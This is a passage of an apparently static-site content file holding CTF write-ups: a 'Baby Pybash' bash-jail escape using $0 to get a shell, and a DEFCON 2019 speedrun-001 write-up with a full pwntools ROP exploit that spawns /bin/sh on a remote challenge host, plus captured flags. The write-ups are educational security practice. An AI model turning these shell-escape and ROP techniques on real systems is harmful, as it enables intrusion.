style=\"color:#22863A;--shiki-dark:#ECC48D\">Decrypted text:\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> decrypted_text\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>And we get the flag!\u003C/p>\n\u003Cblockquote>\n\u003Cp>CSCTF{3ncrypt0r_15nt_s4Fe_w1th_4n_h4Rdc0d3D_k3y!}\u003C/p>\n\u003C/blockquote>\n\u003Ch2 id=\"sandbox\">Sandbox\u003C/h2>\n\u003Ch3 id=\"baby-pybash\">Baby Pybash\u003C/h3>\n\u003Cblockquote>\n\u003Cp>I made a very secure bash terminal in Python. I don’t think anyone can break in!\u003C/p>\n\u003C/blockquote>\n\u003Cp>So we enter a “python bash jail” where we are restricted from certain characters in input to make commands. Let’s analyze the source code to see what we are missing.\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\">!/usr/local/bin/python3 -u\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> subprocess\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> re\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">def\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> restrict_input\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\">command\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    pattern \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> re\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">compile\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">r\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#82AAFF\">[a-zA-Z*^\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\,\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#82AAFF\">,;\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\\\\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#82AAFF\">!@/#?%`\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#82AAFF\">&#x26;()-+]\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">|\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#82AAFF\">[\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">^\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\x00\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#82AAFF\">-\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\x7F\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#82AAFF\">]\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    if\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> pattern\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">search\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">command\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        raise\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> ValueError\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">that's not nice!\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    return\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> command\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">def\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> execute_command\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#FF9800;--shiki-dark:#7FDBCA\">command\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    safe \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> restrict_input\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">command\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    result \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> subprocess\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">run\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">safe\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D7DBE0\"> stdout\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#FF5874\">True\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D7DBE0\"> shell\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#FF5874\">True\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    return\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> result\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">stdout\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Welcome to Baby PyBash!\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">cmd \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\"> input\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Enter a bash command: \u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">output \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> execute_command\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">cmd\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">output\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Wow. We are restricted from the entire alphabet and other special fonts that would bypass like italics. However, we are allowed certian special characters and numbers.\u003C/p>\n\u003Cp>So what we can do is call \u003Ccode>$0\u003C/code> since that calls /bin/bash. Then we can profit!\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">==\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> proof-of-work:\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> disabled\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> ==\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">Welcome\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> to\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> Baby\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> PyBash!\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">Enter\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> a\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> bash\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> command:\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D7DBE0\"> $0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">ls\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">chall.py\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">flag.txt\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">run.sh\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">cat\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> flag.txt\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">CSCTF\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">{b4sH_w1z4rd_0r_ju\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\">$t_ch33s3_m4st3r\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">?_c1d4eeb2a}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cblockquote>\n\u003Cp>CSCTF{b4sH_w1z4rd_0r_ju$t_ch33s3_m4st3r?_c1d4eeb2a}\u003C/p>\n\u003C/blockquote>",{"headings":112,"imagePaths":135,"frontmatter":100},[113,114,117,120,123,126,129,132],{"depth":26,"slug":27,"text":28},{"depth":30,"slug":115,"text":116},"web","Web",{"depth":65,"slug":118,"text":119},"zipzone","ZipZone",{"depth":30,"slug":121,"text":122},"reverse-engineering","Reverse Engineering",{"depth":65,"slug":124,"text":125},"key","Key",{"depth":65,"slug":127,"text":128},"encryptor","Encryptor",{"depth":30,"slug":130,"text":131},"sandbox","Sandbox",{"depth":65,"slug":133,"text":134},"baby-pybash","Baby Pybash",[],"defcon-quals-speedruns",{"id":136,"data":138,"body":144,"filePath":145,"digest":146,"rendered":147},{"author":12,"pubDatetime":139,"modDatetime":140,"title":141,"tags":142,"description":143},["Date","2022-09-23T15:22:00.000Z"],["Date","2023-12-21T09:12:47.400Z"],"defcon 2019 quals speedruns",[16],"Some basic challenges based on the defcon 2019 quals speedrun pwn challenges","\n## Background Information\n\nI suck at pwn, but I want to delve more into low-level languages so I decided to distance myself from web and into languages like C or Rust. I also want to try something that's a little less like reverse engineering since I am really bad at reverse engineering. These speedrun challs were also defined as easy, so I think it will be good practice to learn some fundamentals behind pwn.\n\n### speedrun-001\n\nSo we are provided a binary. We can check for the protections the binary has:\n\n```bash\n[*] '/home/jake/ctf/defcon-2019/speedrun-001/speedrun-001'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n```\n\nOk. So there is no canary and no pie. So we won't have to worry about those at all. \n\nLet's check the binary. \n\nuh oh. this binary is stripped and everything looks like dog. So how about we try things dynamically?\n\nWe execute the binary and are prompted with this:\n\n```bash\njake@computer:~/ctf/defcon-2019/speedrun-001$ ./speedrun-001 \nHello brave new challenger\nAny last words?\n\n```\n\nWe can write basically anything and it will just terminate. So with this, we can imagine a simple buffer overflow(?) All it takes is to find the offset of our input and to the registers in order to manipulate program flow\n\nSo we load gdb and get to analyzing. \n\nWe can basically just start brute forcing payloads with random sizes in order to see where the program crashes. Upon like 2000 the program crashes and we can calculate an offset of 1024. This means that we need to place in 1032 bytes of garbage (+8 to reach the register that controls return) and then we can start trying to find a way to exploit this further\n\nOk. We now can control the return register, but what can we do to achieve our goal of \"pwning\" the system?\n\nLet's try ROP. ROP or (Return Oriented Programming) is an exploitation technique that leverages pieces of code already present in the binary or in loaded libraries, known as \"gadgets\". These then become a large chain of small commands that finally lead to overall code execution.\n\nSince we do not know the libc of the server, we can try to build towards an execve syscall ROP. \n\nLet's find `pop gadgets` because we need those to initalize the registers and prepare arguments to send to the syscall: \n\nUsing `ROPgadget` we are able to locate the essential gadgets needed for the execve syscall ROP:\n\n```python\npop_rax_gadget = 0x0000000000415664\npop_rdi_gadget = 0x0000000000400686\npop_rdx_gadget = 0x00000000004498b5\npop_rsi_gadget = 0x00000000004101f3\n```\n\nWe also collect write and syscall gadgets\n\n```python\nwrite_gadget = 0x000000000048d251\nsyscall = 0x000000000040129c\n```\n\nThe reason we collect the `rax`, `rdi`, `rdx`, and `rsi` gadgets is because `rax` sets the syscall number of execve, `rdi` sets the string '/bin/sh', `rdi` ensures 0 arguments, and `rsi` ensures no environmental variables.\n\nWe collect the write gadget because we need to ensure we can send `/bin/sh` and so we write from rdx to rax.\n\nWe then do basic assembly to intialize the execve syscall and then execute.\n\nFull exploit code here:\n\n```python\nfrom pwn import *\nfrom pwn import p64\n\nelf = ELF('./speedrun-001')\n\nif args.REMOTE:\n    r = remote('35.164.239.133', 31337)\nelse:\n    r = process(elf.path)\n\namount = 1024\npayload = b'A' * (amount + 8)\n\n#prepare ROP chain to go to /bin/sh\n#prepare gadgets\npop_rax_gadget = p64(0x0000000000415664)\npop_rdi_gadget = p64(0x0000000000400686)\npop_rdx_gadget = p64(0x00000000004498b5)\npop_rsi_gadget = p64(0x00000000004101f3) \n\n#prepare the write and syscall gadget (mov qword ptr [rax], rdx ; ret)\nwrite_gadget = p64(0x000000000048d251)\nsyscall = p64(0x000000000040129c)\n#/bin/sh\nrop = pop_rdx_gadget\nrop += b\"/bin/sh\\x00\"\nrop += pop_rax_gadget\nrop += p64(0x6b6000)\nrop += write_gadget\n#prepare four registers with arguments and make syscall\nrop += pop_rax_gadget\nrop += p64(0x3b)\nrop += pop_rdi_gadget\nrop += p64(0x6b6000)\nrop += pop_rsi_gadget\nrop += p64(0x0)\nrop += pop_rdx_gadget\nrop += p64(0x0)\nrop += syscall\n\npayload += rop\n\nr.sendline(payload)\nr.interactive()\n```\n\nWe get the flag!\n\n```bash\n[+] Opening connection to 52.37.0.17 on port 31337: Done\n[*] Switching to interactive mode\nHello brave new challenger\nAny last words?\nThis will be the last thing that you say: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xb5\\x98D\n$ cat /flag\nOOO{Ask any pwner. Any real pwner. It don't matter if you pwn by an inch or a m1L3. pwning's pwning.}\n[*] Got EOF while reading in interactive\n$  \n```","src/content/blog/defcon-quals-speedruns.md","968a4dafff804c0d",{"html":148,"metadata":149},"\u003Ch2 id=\"background-information\">Background Information\u003C/h2>\n\u003Cp>I suck at pwn, but I want to delve more into low-level languages so I decided to distance myself from web and into languages like C or Rust. I also want to try something that’s a little less like reverse engineering since I am really bad at reverse engineering. These speedrun challs were also defined as easy, so I think it will be good practice to learn some fundamentals behind pwn.\u003C/p>\n\u003Ch3 id=\"speedrun-001\">speedrun-001\u003C/h3>\n\u003Cp>So we are provided a binary. We can check for the protections the binary has:\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">] \u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">/home/jake/ctf/defcon-2019/speedrun-001/speedrun-001\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    Arch:\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">     amd64-64-little\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    RELRO:\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">    Partial\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> RELRO\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    Stack:\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">    No\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> canary\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> found\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    NX:\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">       NX\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> enabled\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    PIE:\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">      No\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> PIE\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (0x400000)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Ok. So there is no canary and no pie. So we won’t have to worry about those at all.\u003C/p>\n\u003Cp>Let’s check the binary.\u003C/p>\n\u003Cp>uh oh. this binary is stripped and everything looks like dog. So how about we try things dynamically?\u003C/p>\n\u003Cp>We execute the binary and are prompted with this:\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">jake@computer:~/ctf/defcon-2019/speedrun-001$\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> ./speedrun-001\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">Hello\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> brave\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> new\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> challenger\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">Any\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> last\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> words?\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>We can write basically anything and it will just terminate. So with this, we can imagine a simple buffer overflow(?) All it takes is to find the offset of our input and to the registers in order to manipulate program flow\u003C/p>\n\u003Cp>So we load gdb and get to analyzing.\u003C/p>\n\u003Cp>We can basically just start brute forcing payloads with random sizes in order to see where the program crashes. Upon like 2000 the program crashes and we can calculate an offset of 1024. This means that we need to place in 1032 bytes of garbage (+8 to reach the register that controls return) and then we can start trying to find a way to exploit this further\u003C/p>\n\u003Cp>Ok. We now can control the return register, but what can we do to achieve our goal of “pwning” the system?\u003C/p>\n\u003Cp>Let’s try ROP. ROP or (Return Oriented Programming) is an exploitation technique that leverages pieces of code already present in the binary or in loaded libraries, known as “gadgets”. These then become a large chain of small commands that finally lead to overall code execution.\u003C/p>\n\u003Cp>Since we do not know the libc of the server, we can try to build towards an execve syscall ROP.\u003C/p>\n\u003Cp>Let’s find \u003Ccode>pop gadgets\u003C/code> because we need those to initalize the registers and prepare arguments to send to the syscall:\u003C/p>\n\u003Cp>Using \u003Ccode>ROPgadget\u003C/code> we are able to locate the 